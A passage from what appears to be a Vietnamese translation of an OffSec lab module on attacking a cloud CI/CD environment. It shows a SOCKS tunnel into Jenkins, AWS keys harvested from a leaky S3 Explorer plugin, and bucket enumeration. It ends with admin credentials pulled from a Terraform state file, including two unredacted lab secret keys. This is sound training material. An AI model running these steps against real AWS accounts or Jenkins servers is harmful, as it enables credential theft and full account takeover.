tcp    LISTEN  0       128              [::1]:1080           [::]:*     users:(("ssh",pid=75991,fd=4))  
```

                                                     *Listing 95 - Tạo Local Forward SSH Tunnel*

Tại thời điểm này, chúng ta sẽ có một kết nối hoàn chỉnh từ Kali instance cá nhân tới Jenkins server. Hãy kiểm tra bằng cách cấu hình Firefox trên Kali instance cá nhân sử dụng proxy mới này. Để làm điều đó, chúng ta sẽ nhấp vào hamburger menu ở góc phải trên cùng và chọn Settings.

![image.png](image%2025.png)

                                                          *Figure 26: Mở Settings trong Firefox*

Tiếp theo, chúng ta sẽ tìm Network và nhấp vào Settings....

![image.png](image%2026.png)

                                                *Figure 27: Mở Network Settings Trong Firefox*

Từ đây, chúng ta có thể cấu hình Firefox dùng proxy của chúng ta. Chúng ta sẽ nhấp vào Manual proxy configuration. Với SOCKS Host, chúng ta sẽ dùng 127.0.0.1 và với Port, chúng ta sẽ nhập 1080. Điều này sẽ chỉ thị Firefox gửi traffic mạng tới cổng mà chúng ta đã mở thông qua local SSH tunnel. Traffic đó sau đó sẽ được gửi tới Metasploit SOCKS proxy, đi qua route, và tới Jenkins server (hoặc bất kỳ server nào khác mà chúng ta điều hướng tới). Chúng ta cũng sẽ muốn đảm bảo rằng chúng ta chọn phiên bản v5 của SOCKS proxy. Cuối cùng, chúng ta sẽ nhấp OK.

![image.png](image%2027.png)

                                                        *Figure 28: Thêm Socks Proxy vào Firefox*

Bây giờ, hãy thử điều hướng tới Jenkins server. Chúng ta sẽ nhập IP và cổng mà chúng ta đã phát hiện trước đó ([http://172.30.0.30:8080](http://172.30.0.30:8080/)).

![image.png](image%2028.png)

                                                             *Figure 29: Jenkins trong Firefox*

Kết nối sẽ chậm vì nó đi qua nhiều lớp tunnel. Tuy nhiên, sau một lúc, trang sẽ tải. Ở đây, chúng ta sẽ thấy liên kết để tạo một tài khoản.

---

## **10.4. Exploiting Jenkins**

---

Vì Jenkins đang mở self-registration, hãy bắt đầu bằng cách tạo một tài khoản để có thể tiếp tục liệt kê. Chúng ta sẽ nhấp vào liên kết **create an account** và nhập các thông tin cần thiết.

![image.png](image%2029.png)

                                                         *Figure 30: Tạo Tài Khoản Jenkins*

Ngay sau khi tạo tài khoản, chúng ta sẽ được đăng nhập vào Jenkins. Chiến lược phân quyền (authorization strategy) trong Jenkins khá bất thường. Cài đặt mặc định của Jenkins có cơ chế phân quyền rất sơ khai, theo đó hoặc là bất kỳ người dùng nào (kể cả chưa xác thực) cũng có thể làm mọi thứ, hoặc bất kỳ người dùng đã đăng nhập nào cũng có thể làm mọi thứ, hoặc chỉ user admin có thể làm mọi thứ và tất cả các user khác chỉ có quyền read-only. Các cấu hình nâng cao hơn là có thể, nhưng điều này yêu cầu Jenkins phải cài thêm các plugin bổ sung, như Matrix Authorization Strategy hoặc Role-based Authorization Strategy.

Chúng ta sẽ phải điều hướng xung quanh để tìm hiểu user của mình có và không có quyền truy cập vào những gì. Trước tiên, hãy điều hướng tới **Dashboard** bằng cách nhấp vào liên kết ở góc trên bên trái.

![image.png](image%2030.png)

                                                             *Figure 31: Điều Hướng Tới Dashboard*

Từ đây, chúng ta sẽ thấy một vài project. Một trong số đó có tên **hackshort**; chúng ta sẽ giả định đây là project cập nhật container hackshort, thứ đã dẫn tới việc chúng ta có được shell. Chúng ta cũng thấy một project có tiêu đề **company-dir**. Hãy điều tra sâu hơn bằng cách nhấp vào tên project này.

![image.png](image%2031.png)

                                                              *Figure 32: Company Directory*

Từ danh sách các action (Status, Changes, Build now, và S3 Explorer), chúng ta nhận thấy rằng mình bị giới hạn rất nhiều trong những thứ có thể làm. Thông thường, nếu chúng ta có đầy đủ đặc quyền trên một project, chúng ta sẽ có thể chỉnh sửa cấu hình. Tuy nhiên, tùy chọn **S3 Explorer** lại cực kỳ thú vị.

S3 Explorer không phải là một plugin mặc định được cài đặt trong Jenkins. Nếu tìm kiếm trực tuyến về **S3 Explorer Jenkins Plugin**, chúng ta sẽ thấy trang chủ với một banner cho biết có một lỗ hổng ảnh hưởng tới plugin này. Lỗ hổng này cho biết ứng dụng hiển thị các AWS secret mà không che (mask) chúng.

![image.png](image%2032.png)

                                                     *Figure 33: Cảnh Báo Trên Trang Chủ Plugin*

Đọc phần mô tả còn lại, chúng ta thấy rằng plugin này là một implementation trong Jenkins của project **aws-js-s3-explorer**. Điều này đặc biệt thú vị, bởi vì trên trang repository của project, chúng ta thấy mô tả sau:

> AWS JavaScript S3 Explorer (v2 alpha) là một ứng dụng JavaScript sử dụng JavaScript SDK của AWS và các API S3 để giúp việc duyệt nội dung của một S3 bucket thông qua trình duyệt web trở nên dễ dàng. Chúng tôi tạo ra công cụ này để cho phép việc chia sẻ và quản lý object và dữ liệu trong Amazon S3 trở nên thuận tiện hơn.
> 

Các file `index.html`, `explorer.js`, và `explorer.css` trong bucket này chứa toàn bộ ứng dụng.

Vì toàn bộ ứng dụng nằm trong ba file này, và trang đang sử dụng JavaScript để duyệt một S3 Bucket, điều này có nghĩa là AWS ID và key sẽ có thể truy cập được trong source của trang. Hãy nhấp vào tùy chọn **S3 Explorer** trong Jenkins và tìm kiếm ID và key.

![image.png](image%2033.png)

                                                          *Figure 34: Điều Hướng Tới S3 Explorer*

Khi trang được tải, chúng ta thấy bucket được cấu hình để liệt kê là: **company-directory-9b58rezp3vvkf90f**.

Vì các kết nối tới Jenkins khá chậm, plugin S3 Explorer thường gặp các vấn đề khiến bucket không được liệt kê. Điều này không làm thay đổi nội dung HTML, và chúng ta vẫn có thể tiếp tục khai thác.

Tuy nhiên, chúng ta chưa thấy các key. Hãy nhấp chuột phải ở bất kỳ đâu trên trang và chọn **View Source**.

![image.png](image%2034.png)

                                                      *Figure 35: Xem Source Trên S3 Explorer*

Thao tác này sẽ cung cấp cho chúng ta HTML của trang, nơi chúng ta có thể tìm kiếm thông tin xác thực AWS.

```
...<div id="page-wrapper" ng-controller="SettingsController"></div></div><input id="awsregion" type="hidden" value="us-east-1"><input id="awsid" type="hidden" value="REDACTED_AWS_ACCESS_KEY_ID"><input id="awskey" type="hidden" value="REDACTED_AWS_SECRET_ACCESS_KEY"><input id="bucket" type="hidden" value="company-directory-9b58rezp3vvkf90f"></div></div><footer class="page-footer"><div class="container-fluid"><div class="page-footer__flex-row"><div class="page-footer__footer-id-placeholder" id="footer"></div><div class="page-footer__links page-footer__links--white jenkins_ver"><a rel="noopener noreferrer" href="https://www.jenkins.io/" target="_blank">Jenkins 2.385</a></div></div></div></footer></body></html><script src="http://automation.offseclab.io/plugin/s3explorer/js/s3explorer.js"></script>
```

                                                    *Listing 96 - Tìm Thấy AWS Key Trong Source*

Khi quét HTML, chúng ta tìm thấy một số input bị ẩn: **`awsregion`**, **`awsid`**, và **`awskey`**, mỗi input đều chứa các giá trị khớp với thông tin xác thực AWS. Hãy ghi lại những thông tin này và thử sử dụng chúng với công cụ **AWS CLI** của chúng ta.

---

## **10.5. Enumerating with Discovered Credentials**

---

Bây giờ khi chúng ta đã phát hiện được một số thông tin xác thực, hãy sử dụng chúng để tiếp tục liệt kê môi trường mục tiêu. Chúng ta sẽ bắt đầu bằng cách chạy subcommand **configure** với AWS client. Chúng ta sẽ lưu các thông tin xác thực này trong profile **stolen-s3** bằng cách sử dụng tùy chọn `--profile`.

```
kali@kali:~$ aws configure --profile=stolen-s3
AWS Access Key ID [None]: REDACTED_AWS_ACCESS_KEY_ID
AWS Secret Access Key [None]: REDACTED_AWS_SECRET_ACCESS_KEY
Default region name [None]: us-east-1
Default output format [None]: 
```

                                                 *Listing 97 - Cấu Hình AWS S3 Profile stolen-s3*

Sau khi cấu hình xong, chúng ta sẽ tiếp tục sử dụng aws với tham số `--profile=stolen-s3` để lấy **Account ID** và **username** gắn với các thông tin xác thực này. Việc này cũng sẽ xác nhận rằng các thông tin xác thực là hợp lệ. Chúng ta sẽ làm điều này bằng cách sử dụng lệnh **sts** và subcommand **get-caller-identity**.

```
kali@kali:~$ aws --profile=stolen-s3 sts get-caller-identity
{
    "UserId": "AIDAUBHUBEGIFYDAVQPLB",
    "Account": "347537569308",
    "Arn": "arn:aws:iam::277537169808:user/s3_explorer"
}
```

                                               *Listing 98 - Lấy Account ID và Tên Người Dùng*

Mặc dù nội dung output này không mang tính đột phá, nó cho chúng ta biết rằng các thông tin xác thực là hợp lệ và, dựa trên username, được tạo riêng cho S3 Explorer. Nếu được cấu hình đúng, các thông tin xác thực này sẽ bị giới hạn về những gì chúng có thể thực hiện. Hãy thử liệt kê các user policy được gắn với user này. Lần này, chúng ta sẽ sử dụng lệnh **iam** và subcommand **`list-user-policies`**. Chúng ta sẽ cung cấp username đã tìm thấy trong output ở Listing bên trên với tùy chọn `--user-name`.

```
kali@kali:~$ aws --profile=stolen-s3 iam list-user-policies --user-name s3_explorer

An error occurred (AccessDenied) when calling the ListUserPolicies operation: User: arn:aws:iam::277537169808:user/s3_explorer is not authorized to perform: iam:ListUserPolicies on resource: user s3_explorer because no identity-based policy allows the iam:ListUserPolicies action
```

                        *Listing 99 - Không Thể Liệt Kê User Policies Gắn Với User Đã Cấu Hình*

Đáng tiếc là user này thậm chí còn không có quyền liệt kê policy của chính mình. Để xác định những action nào được phép, chúng ta có thể brute force mọi action. Tuy nhiên, chúng ta cũng có thể tiếp cận vấn đề này một cách có phương pháp hơn.

Mục đích của các thông tin xác thực này là để liệt kê bucket **`company-directory-9b58rezp3vvkf90f`**. Hãy sử dụng lệnh **s3** với subcommand **`ls`** để liệt kê nội dung của bucket này.

```
kali@kali:~$ aws --profile=stolen-s3 s3 ls company-directory-9b58rezp3vvkf90f
2023-07-06 13:49:19        117 Alen.I.vcf
2023-07-06 13:49:19        118 Goran.B.vcf
2023-07-06 13:49:19        117 Zeljko.B.vcf
```

                                             *Listing 100 - Liệt Kê S3 Bucket Company Directory*

Đúng như mong đợi, thao tác này đã thành công! Hãy thử tiến thêm một bước nữa và liệt kê tất cả các bucket trong account. Để làm điều này, chúng ta sẽ cần sử dụng **s3api** và subcommand **`list-buckets`**.

```
kali@kali:~$ aws --profile=stolen-s3 s3api list-buckets
{
    "Buckets": [
        {
            "Name": "company-directory-9b58rezp3vvkf90f",
            "CreationDate": "2023-07-06T16:21:16+00:00"
        },
        {
            "Name": "tf-state-9b58rezp3vvkf90f",
            "CreationDate": "2023-07-06T16:21:16+00:00"
        }
    ]
    ...
}
```

                                        *Listing 101 - Liệt Kê Tất Cả Các Bucket Từ Account stolen-s3*

Khi liệt kê các bucket, chúng ta tìm thấy bucket **company-directory** đã được liệt kê khi truy cập trang S3 Explorer. Chúng ta cũng tìm thấy một bucket có tiền tố **tf-state**. Từ viết tắt “tf” trong môi trường cloud thường ám chỉ **Terraform**, và Terraform state thường là file được dùng để lưu cấu hình hiện tại, bao gồm cả các bí mật tiềm năng. Hãy tiếp tục điều tra sâu hơn!

---

## 10.6. Phát Hiện State File và Leo Thang Lên Admin

---

Mục tiêu của chúng ta bây giờ là đọc Terraform state file. Để làm được điều này, tài khoản phải có quyền **`read`** được gán. Tuy nhiên, chúng ta cần biết tên của file cần đọc. Để xác định điều đó, chúng ta cần quyền **`list`**, quyền này cho phép liệt kê các object trong bucket để khám phá tên của state file. Mặc dù quyền list không phải là bắt buộc, nhưng nếu chúng ta có cả hai quyền, chúng ta sẽ có thể dễ dàng xem state file và có khả năng tìm thấy một số bí mật.

Hãy bắt đầu bằng cách liệt kê bucket **`tf-state`**. Chúng ta sẽ sử dụng lệnh aws với tùy chọn profile để chỉ định thông tin xác thực đã thu được (**stolen-s3**). Sau đó, chúng ta sẽ dùng lệnh **s3** với subcommand **ls** để liệt kê bucket.

```
kali@kali:~$ aws --profile=stolen-s3 s3 ls tf-state-9b58rezp3vvkf90f    
2023-07-06 12:19:16       6731 terraform.tfstate
```

                                                   *Listing 102 - Liệt Kê Terraform State Bucket*

Có vẻ như chúng ta có quyền liệt kê bucket! Tiếp theo, hãy thử đọc file. Chúng ta sẽ làm điều này bằng cách copy file về Kali instance cục bộ của mình. Một lần nữa, chúng ta sẽ dùng lệnh **aws s3**, lần này với thao tác **cp** để copy file **`terraform.tfstate`** từ bucket **`tf-state-9b58rezp3vvkf90f`** về thư mục hiện tại. Chúng ta cũng cần thêm tiền tố **`s3://`** vào tên bucket để chỉ thị cho AWS CLI rằng chúng ta đang copy từ một bucket S3 chứ không phải từ một thư mục cục bộ.

```
kali@kali:~$ aws --profile=stolen-s3 s3 cp s3://tf-state-9b58rezp3vvkf90f/terraform.tfstate ./
download: s3://tf-state-9b58rezp3vvkf90f/terraform.tfstate to ./terraform.tfstate
```

                             *Listing 103 - Copy Terraform State File Về Kali Instance Cục Bộ*

Chúng ta đã tải file thành công! Hãy mở file và bắt đầu xem xét nội dung của nó. Chúng ta sẽ xem file theo từng phần.

```
kali@kali:~$ cat -n terraform.tfstate
001  {
...
007      "user_list": {
008        "value": [
009          {
010            "email": "Goran.Bregovic@offseclab.io",
011            "name": "Goran.B",
012            "phone": "+1 555-123-4567",
013            "policy": "arn:aws:iam::aws:policy/AdministratorAccess"
014          },
015          {
016            "email": "Zeljko.Bebek@offseclab.io",
017            "name": "Zeljko.B",
018            "phone": "+1 555-123-4568",
019            "policy": "arn:aws:iam::aws:policy/ReadOnlyAccess"
020          },
021          {
022            "email": "Alen.Islamovic@offseclab.io",
023            "name": "Alen.I",
024            "phone": "+1 555-123-4569",
025            "policy": "arn:aws:iam::aws:policy/ReadOnlyAccess"
026          }
027        ],
...
041    },
```

                                                     *Listing 104 - Xem Xét State File - Users*

Phần đầu của Terraform state file là nơi chúng ta tìm thấy danh sách người dùng và các policy được gán tương ứng. Chúng ta tìm thấy ba người dùng, trong đó hai người có **ReadOnlyAccess** - nhưng người đầu tiên, **Goran.B**, có **AdministratorAccess**. Hy vọng rằng chúng ta có thể tìm thấy AWS ID và Key của người dùng này trong state file. Hãy tiếp tục xem xét file.

```
042    "resources": [
043      {
...
049          {
050            "index_key": "Alen.I",
051            "schema_version": 0,
052            "attributes": {
...
056              "id": "REDACTED_AWS_ACCESS_KEY_ID",
...
059              "secret": "l1VWHtf3ms4THJlnE6d0c8xZ3253WasRjRijvlWm",
...
063            },
...
069          },
070          {
071            "index_key": "Goran.B",
072            "schema_version": 0,
073            "attributes": {
...
077              "id": "REDACTED_AWS_ACCESS_KEY_ID",
...
080              "secret": "w4GXZ4n9vAmHR+wXAOBbBnWsXoQ7Sh4Rcdvu1OC2",
...
084            },
...
090          },
...
```

                                                       *Listing 105 - Xem Xét State File - Keys*

Khi cuộn xuống trong file, chúng ta bắt đầu phát hiện các thuộc tính cho những user đã được tạo, bao gồm **ID** và **Secret** của họ. Vì chúng ta đã xác định rằng **Goran.B** có thể có quyền administrator, hãy sử dụng aws để cấu hình một profile mới. Chúng ta sẽ đặt tên profile này là **goran.b** và cung cấp ID, Key, cùng với region.

```
kali@kali:~$ aws configure --profile=goran.b                                                 
AWS Access Key ID [None]: REDACTED_AWS_ACCESS_KEY_ID
AWS Secret Access Key [None]: REDACTED_AWS_SECRET_ACCESS_KEY
Default region name [None]: us-east-1
Default output format [None]: 
```

                                    *Listing 106 - Cấu Hình Profile Goran.B Bằng AWS CLI*

Tiếp theo, hãy thử liệt kê các user policy được gắn để xác nhận rằng user này thực sự là administrator. Chúng ta sẽ làm điều này bằng cách sử dụng lệnh **iam** với tùy chọn **`list-attached-user-policies`**, đồng thời cung cấp **`user-name`**.

```
kali@kali:~$ aws --profile=goran.b iam list-attached-user-policies --user-name goran.b
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

                              *Listing 107 - Liệt Kê User Policies Được Gắn Với Profile Goran.B*

Tuyệt vời! Chúng ta đã leo thang đặc quyền thành công lên **administrator** trong Cloud account của môi trường này.

---

# 11. Tổng kết

---

Trong Learning Module này, chúng ta đã tìm thấy một ứng dụng làm mục tiêu ban đầu. Thông qua quá trình liệt kê, chúng ta phát hiện rằng ứng dụng sử dụng các file được lưu trữ trong một S3 bucket được cấu hình không đúng. Trong khi tìm kiếm trong bucket này, chúng ta đã phát hiện một git repository chứa thông tin xác thực trong lịch sử commit. Chúng ta đã sử dụng các thông tin xác thực này để pivot quyền truy cập sang Git. Tiếp tục quá trình liệt kê, chúng ta phát hiện một file định nghĩa pipeline mà chúng ta có thể chỉnh sửa bằng các thông tin xác thực đã đánh cắp. Bằng cách chỉnh sửa file này, chúng ta đã đầu độc pipeline bằng một payload tự xây dựng để đánh cắp thêm các bí mật và xâm phạm toàn bộ môi trường.

Ngoài ra, thông qua việc thu thập thông tin tình báo nguồn mở (open-source intelligence), chúng ta phát hiện rằng ứng dụng sử dụng một dependency không được liệt kê trên Python index công khai. Chúng ta giả định rằng nếu chúng ta phát hành một dependency có phiên bản cao hơn phiên bản đã phát hiện, mục tiêu sẽ tải về và sử dụng dependency độc hại của chúng ta. Giả định này là chính xác, và chúng ta đã đạt được thực thi mã trong môi trường production. Với khả năng thực thi mã, chúng ta đã quét các mạng nội bộ để tìm thêm các dịch vụ và phát hiện một Jenkins server với self-registration được bật. Bằng cách tạo một tài khoản, chúng ta đã phát hiện một plugin dễ bị tổn thương đang được sử dụng, plugin này làm rò rỉ các AWS key. Khi liệt kê các quyền mà chúng ta có với những key này, chúng ta đã phát hiện một S3 bucket chứa một Terraform state file. Khi xem xét state file, chúng ta tìm thấy thông tin xác thực của một administrator, dẫn tới việc xâm phạm hoàn toàn môi trường.

Để tránh các vấn đề liên quan tới DNS trong tương lai, chúng ta cần reset lại cấu hình DNS trên máy Kali cá nhân của mình. Để làm điều này, chúng ta sẽ sử dụng `nmcl`i với subcommand **`connection modify`** để thay đổi connection của chúng ta (“Wired connection 1” trong trường hợp này) thành có giá trị **ipv4.dns** rỗng.

<aside>
💡

Nếu bạn có một DNS server ưa thích, đây là thời điểm thích hợp để thiết lập nó.

</aside>

```
kali@kali:~$ nmcli connection modify "Wired connection 1" ipv4.dns ""
kali@kali:~$ sudo systemctl restart NetworkManager
```

                                                  *Listing 108 - Reset Lại Cấu Hình DNS*

Chúng ta có thể đảm bảo mọi thứ hoạt động như mong đợi bằng cách truy cập bất kỳ trang web công khai nào trong trình duyệt.

Chúng ta cũng đã thực hiện một số thay đổi trong Module này có thể gây ra sự cố nếu không được hoàn nguyên. Chúng ta đã tạo hai file (**`~/.pypirc`** và **`~/.config/pip/pip.conf`**) làm thay đổi cấu hình mặc định của pip. Chúng ta nên xóa các file này.

```
kali@kali:~$ rm ~/.pypirc
kali@kali:~$ rm ~/.config/pip/pip.conf
```

                                                              *Listing 109 - Xóa Các File Cấu Hình pip*

Chúng ta cũng đã bật SOCKS proxy trong Firefox trên Kali cá nhân. Chúng ta nên gỡ bỏ cấu hình này vì SOCKS proxy sẽ được đóng.

Cuối cùng, chúng ta có thể đảm bảo mọi thứ hoạt động bình thường bằng cách truy cập bất kỳ trang web công khai nào trong trình duyệt.